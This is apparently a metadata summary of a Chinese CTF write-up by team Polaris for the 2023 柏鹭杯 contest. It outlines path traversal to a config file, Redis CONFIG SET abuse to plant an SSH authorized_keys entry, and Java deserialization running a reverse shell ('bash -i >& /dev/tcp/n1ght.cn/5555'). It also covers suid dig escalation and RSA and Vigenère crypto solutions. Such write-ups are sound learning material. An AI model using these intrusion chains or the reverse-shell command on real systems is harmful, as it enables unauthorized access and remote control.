...
quality: high
full_path: 柏鹭杯2023_WP_-Polaris战队.full.md
meta_path: 柏鹭杯2023_WP_-Polaris战队.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: 柏鹭杯2023 WP -Polaris战队。柏鹭杯2023 Polaris战队综合WP：PWN+Redis SSH公钥+Java反序列化+Express file协议+RSA连分数+维吉尼亚。经验：Redis写authorized_keys免密登录+连分数求RSA p/q+Java反序列化Runtime反弹shell
category: pwn
...
contest_type: open
wp_url: https://www.ctfiot.com/139080.html
reasoning_chain:
- 综合 7 题目录走查 → 触发点：先扫配置文件 → ../../../../usr/local/share/application.properties
- 假设：Spring 应用泄露 redis 配置 → 动作：路径穿越读 properties
- 观察：redis://172.25.0.10:62341 + 密码 de17cb1cfa1a8e8011f027b416775c6a → 下一步：写 SSH 公钥
- 动作：ssh-keygen 生成密钥 + redis-cli -x set xqq + config set dir /root/.ssh + dbfilename authorized_keys + save
- 观察：proxychains4 ssh -i id_rsa root@172.25.0.10 免密登录成功
- '综合 6: Java Ping 反序列化 + Runtime.exec("bash -i >& /dev/tcp/n1ght.cn/5555") → 触发点：suid dig 提权'
- 'Crypto RSA: leak=pow(p-q, num1, n) + num1*num2 是 N → 假设：已知 num1,num2 可解 p,q'
- 动作：continued_fraction(num3).convergents() 筛选 512-bit prime p/q
- d=invert(e, (num1-1)*(num2-1)) + pow(leak, d, n) 得 p-q → 解 p,q,n,m
- '密码 2: 自定义维吉尼亚表 _l 轮转 + k1[i1] 与 k2[i2] 互逆 → 动作：写回文 key 解码'
failed_attempts:
- 试图直接 redis-cli 连 172.25.0.10 → 失败：未走 proxychains 走不出内网
- 试图爆破 RSA 私钥 → 失败：n 太大，必须用连分数收敛子找 p,q
- 试图爆破 SSH 密码 → 失败：题面没设密码，必须用 authorized_keys
key_observations:
- redis-cli -x set + config set dir /dbfilename 是 Redis SSH 公钥注入标准链
- RSA leak=pow(p-q, e1, n1*n2) 时 e1 是相对 n1 的 e，可用 invert 还原 (p-q)
- continued_fraction(num3).convergents() 是连分数攻击标准 API
- 自定义表维吉尼亚与标准维吉尼亚解法相同，关键是构造回文 key
- Java 反序列化 Ping 类 Runtime.exec 是 CommonsCollections 等价的常用 gadget
prerequisites:
- Redis 安全（CONFIG SET dir/dbfilename + 持久化写文件）
- RSA 数论基础（欧拉函数 + invert + 模幂）
- Sage 连分数 API
- Java 反序列化 gadget 构造（Ping/CC/CommonsBeanutils）
---
